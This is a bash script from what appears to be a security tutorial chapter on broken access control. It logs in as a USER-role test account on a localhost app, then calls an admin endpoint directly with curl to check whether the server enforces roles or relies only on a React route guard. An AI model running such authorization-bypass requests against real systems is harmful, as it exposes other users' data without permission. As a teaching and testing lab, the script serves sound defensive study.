#!/usr/bin/env bash
#
# Chapter 12 — Frontend guard, no server check
#
# The attack doesn't even involve the frontend. We just call the API
# directly with a USER-role token and see whether the server enforces
# the role on its own.
#
# Run this against the FIXED AdminController (Ch 11 fix in place) and
# the server returns 403 — the frontend guard is irrelevant.
#
# Run it against the VULNERABLE AdminController (Ch 11 vuln in place)
# and the server returns 200 with all user data. The frontend's guard
# was the entire defense, and we bypassed it by not running the frontend.

set -euo pipefail
API="${API:-http://localhost:8080}"

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

bold "[1/2] Login as alice (USER role) — no admin permissions"
LOGIN=$(curl -sS -X POST "${API}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@example.com","password":"alice123!"}')
TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo

bold "[2/2] Skip the React app — call the admin endpoint directly with curl"
gray "  GET ${API}/api/admin/users  (with USER token)"
RESPONSE=$(curl -sS -o /tmp/resp.json -w '%{http_code}' \
  -H "Authorization: Bearer ${TOKEN}" \
  "${API}/api/admin/users")
echo "  HTTP ${RESPONSE}"
echo "  Body: $(head -c 300 /tmp/resp.json)"
echo

if [ "$RESPONSE" = "403" ]; then
  bold "ATTACK BLOCKED — server enforced the role check independently of the frontend."
elif [ "$RESPONSE" = "200" ]; then
  bold "ATTACK SUCCEEDED — server did NOT enforce a role check."
  echo "  The React route guard is the only thing standing between any"
  echo "  authenticated user and admin data — and curl doesn't run React."
  exit 1
else
  bold "Unexpected response (${RESPONSE})."
  exit 2
fi
